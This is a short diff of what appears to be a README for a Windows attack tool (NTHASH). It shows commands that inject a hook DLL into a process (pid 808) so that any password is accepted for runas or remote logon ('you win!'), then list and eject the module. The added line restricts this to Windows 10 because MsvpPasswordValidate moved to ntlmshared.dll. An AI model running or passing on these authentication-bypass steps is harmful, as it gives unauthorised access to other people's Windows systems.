@@ -7,3 +7,5 @@ optionally, check that our dll as been injected : NTHASH-win64.exe /enummod /pid
 test runas /user:Admin cmd OR log on remotely (provide any password) : you win!</br>
 NTHASH-win64.exe /eject /pid:808 /binary:hook-win64.dll</br>
 optionally, check that our dll as been ejected : NTHASH-win64.exe /enummod /pid:808 | findstr hook</br>
+
+Windows 10 only (since MsvpPasswordValidate now moved in ntlmshared.dll).
